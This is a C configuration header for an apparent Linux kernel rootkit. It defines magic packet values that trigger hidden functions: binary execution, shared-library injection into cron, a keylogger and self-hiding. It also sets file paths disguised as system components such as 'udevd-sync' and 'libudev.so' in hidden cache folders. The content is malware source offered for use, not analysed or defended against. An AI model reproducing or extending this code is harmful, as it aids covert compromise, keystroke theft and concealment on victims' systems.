// config.h
#ifndef CONFIG_H
#define CONFIG_H

// CFLAGS_MODULE="-DDEBUG" in Makefile
#ifdef DEBUG
  #define DBG_PRINT(fmt, ...) pr_info(fmt, ##__VA_ARGS__)
#else
  #define DBG_PRINT(fmt, ...) do {} while (0)
#endif

// Packet magic payloads - change into random values in real usage
// Hashes for now 
#define BINARY_RUNNER_PAYLOAD 0xa5aac5c3    // rootkit_binary_exec
#define INJECTOR_PAYLOAD 0xd96f7d03         // rootkit_injector___
#define INJECTOR_EXIT_PAYLOAD 0xf1df4b28    // rootkit_injector_ex
#define KEYLOGGER_PAYLOAD 0x4f15ec24        // rootkit_keylog_____
#define KEYLOGGER_EXIT_PAYLOAD 0xbf19531b   // rootkit_keylog_ex__
#define HIDE_PAYLOAD 0xde37492f             // rootkit_hide_______
#define HELPER_REC_SIG_PAYLOAD 0xec4effc    // rootkit_rec_signal_

// Listener
#define REC_PATH "/var/lib/.cache/udevd-sync"
#define ENV_PATH "PATH=/sbin:/bin:/usr/sbin:/usr/bin"

// Shell injector
#define CRON_PATH "/usr/sbin/cron"
#define INJECT_SO_PATH "/tmp/.cache/libudev.so"
#define SO_NAME "libudev"

// Keylogger
#define MAX_KEYLOG_SIZE 8192 // Make sure it matches config.h in userspace

#endif // CONFIG_H
